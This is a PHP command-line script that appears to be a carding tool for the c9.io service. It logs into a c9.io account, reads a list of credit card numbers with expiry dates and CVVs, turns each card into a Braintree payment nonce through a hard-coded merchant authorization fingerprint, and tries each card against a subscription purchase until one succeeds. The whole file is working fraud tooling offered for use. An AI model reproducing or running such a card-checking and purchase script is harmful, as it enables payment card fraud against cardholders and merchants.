<?php 
require 'lib.php'; 
// C9.IO Auto Payment | Good Idea - YarzCode  
function getNonce($cc) 
{ 
    $cc = explode("|", $cc); 
    $ccnum = trim($cc[0]); 
    $ccexp = trim($cc[1])."/".trim($cc[2]); 
    $cvv = trim($cc[3]); 
    $url  = 'https://api.braintreegateway.com/merchants/zfpfskb7t777z87y/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=&authorizationFingerprint=01d8882487a51d7b4430c37146808cbf4b8105ff2833521d4593dcfff5b784e9%7Ccreated_at%3D2019-01-18T04%3A48%3A35.924081265%2B0000%26merchant_id%3Dzfpfskb7t777z87y%26public_key%3Ddd438nvhb328z48w&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=497d55a1-b257-4622-826a-118f79377f4a&share=undefined&creditCard%5BbillingAddress%5D%5BpostalCode%5D=11312&creditCard%5BcardholderName%5D=asddas&creditCard%5Bnumber%5D='.$ccnum.'&creditCard%5BexpirationDate%5D='.urlencode($ccexp).'&creditCard%5Bcvv%5D='.$cvv.'&creditCard%5Boptions%5D%5Bvalidate%5D=false&_method=POST&callback=callback_json7f807a7aa025420cbe0510361547d519';
    $send = yarzCurl($url); 
    preg_match('/"nonce":"(.*?)"/', $send[1], $nonce); 
    if(isset($nonce[1])) 
    { 
        return $nonce[1]; 
    } else { 
        return false; 
    } 
} 

function login($email, $password) 
{ 
$headers = array(); 
$headers[] = 'Origin: https://c9.io'; 
$headers[] = 'Accept-Encoding: gzip, deflate, br'; 
$headers[] = 'Accept-Language: en-US,en;q=0.9'; 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'; 
$headers[] = 'Content-Type: application/json'; 
$headers[] = 'Accept: */*'; 
$headers[] = 'Referer: https://c9.io/login'; 
$headers[] = 'X-Requested-With: xmlhttprequest'; 
$headers[] = 'Connection: keep-alive'; 
    $send = yarzCurl('https://c9.io/auth/login', '{"username":"'.$email.'","password":"'.$password.'"}', 'cookies.txt' , $headers, false, true); 
    if(stripos($send[1], '"uid"')) 
    { 
        $sendAg = yarzCurl('https://c9.io/api/nc/auth?client_id=profile_direct&responseType=direct&login_hint=&immediate=1', false, 'cookies.txt'); 
        return $sendAg[1]; 
    } else { 
        return false; 
    } 
} 

function payment($token, $nonce) 
{ 
    $headers = array(); 
    $headers[] = 'Origin: https://c9.io'; 
    $headers[] = 'Accept-Encoding: gzip, deflate, br'; 
    $headers[] = 'Accept-Language: en-US,en;q=0.9'; 
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'; 
    $headers[] = 'Content-Type: application/json'; 
    $headers[] = 'Accept: application/json'; 
    $headers[] = 'Connection: keep-alive'; 
    $send = '{"add":"2c92a0f951381feb015158e0c17a0f96","account":{"paymentMethodNonce":"'.$nonce.'"}}'; 
    $subs = 'https://api.c9.io/account/subscription?access_token='.$token; 
    $pay = yarzCurl($subs, $send, false, $headers); 

    if(!stripos($pay[1], 'error')) 
    { 
        return 'SUCCESS'; 
    } else { 
        preg_match('/"message":"(.*?)"/', $pay[1], $msg); 
        return $msg[1]; 
    } 
} 
echo "YarzCode - Silent is better than bullshit.\n\n"; 
echo 'Enter username: '; 
$username = trim(fgets(STDIN)); 
echo 'Enter password: '; 
$password = trim(fgets(STDIN)); 

$login = login($username, $password); 

if($login !== false) 
{ 
    echo "\n\n"; 
    echo "Enter List CC: "; 
     $fileList = trim(fgets(STDIN)); 
    if(!file_exists($fileList)) 
    { 
        die("Error: List not found"); 
    } 
    $dataList = file_get_contents($fileList); 
    $fak = explode("\n", $dataList); 
    foreach($fak as $data) 
    { 
        $cc = explode("|", $data); 
        $ccnum = trim($cc[0]); 
        $ccexp = trim($cc[1])."/".trim($cc[2]); 
        $cvv = trim($cc[3]); 
        $format = $ccnum."|".$ccexp."|".$cvv; 
        $nonce = getNonce($data); 
        $pay = payment($login, $nonce); 
        if($pay == 'SUCCESS') 
        { 
            echo "$format => Success\n"; 
            die(); 
        } else { 
            echo "$format => ".$pay."\n"; 
        } 
    } 
} else { 
    die("\nLogin Failed."); 
}
